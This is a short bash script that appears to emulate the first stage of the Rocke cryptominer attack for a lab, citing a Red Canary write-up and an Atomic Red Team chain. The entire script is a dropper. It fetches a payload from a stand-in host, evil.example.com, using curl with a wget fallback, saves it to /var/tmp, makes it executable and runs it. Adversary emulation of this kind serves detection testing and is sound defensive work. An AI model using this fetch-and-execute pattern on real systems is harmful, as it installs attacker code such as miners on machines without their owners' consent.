#!/bin/bash

# Heavily inspired by https://redcanary.com/blog/rocke-cryptominer/ and https://github.com/redcanaryco/atomic-red-team/blob/48ad5e308d7e58754fc0e3419e720e44339d0a89/ARTifacts/Chain_Reactions/rocke-and-roll-stage-01.sh

# This wont work due to network restrictions in the lab env
# (Payload already in place at /var/tmp/sF3gViaw)
curl -fsSL --connect-timeout 1 https://evil.example.com/raw/sF3gViaw -o /var/tmp/sF3gViaw || wget https://evil.example.com/raw/sF3gViaw -O /var/tmp/sF3gViaw 

chmod +x /var/tmp/sF3gViaw

/bin/bash /var/tmp/sF3gViaw
